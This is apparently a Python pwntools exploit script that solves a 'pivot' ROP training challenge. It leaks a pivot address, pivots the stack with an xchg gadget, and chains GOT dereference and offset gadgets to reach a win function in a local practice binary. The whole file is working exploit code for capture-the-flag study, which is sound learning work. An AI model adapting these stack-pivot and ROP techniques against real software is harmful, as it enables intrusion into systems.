from pwn import *

foothold_function = 0x400850
puts = 0x400800
foothold_function_got = 0x602048
foothold_offset = 0x970
ret2win_effective_offset = 0xabe - foothold_offset

# pop rax; ret;
gadget1 = 0x400b00
# xchg rsp,rax; ret;
gadget2 = 0x400b02
# mov rax,QWORD PTR [rax]; ret;
gadget3 = 0x400b05
# add rax,rbp; ret;
gadget4 = 0x400b09
# call rax;
gadget5 = 0x40098e
# pop rbp; ret;
gadget6 = 0x400900

rop_chain = ''
rop_chain += p64(foothold_function)

rop_chain += p64(gadget1)
rop_chain += p64(foothold_function_got)

rop_chain += p64(gadget3)

rop_chain += p64(gadget6)
rop_chain += p64(ret2win_effective_offset)

rop_chain += p64(gadget4)

rop_chain += p64(gadget5)

p = process('./pivot')

p.recvuntil('pivot: ')
pivot = int(p.recvuntil('\n'), 16)

p.sendline(rop_chain)

payload = 'a' * 40

payload += p64(gadget1)
payload += p64(pivot)

payload += p64(gadget2)

p.sendline(payload)
print p.recvall()
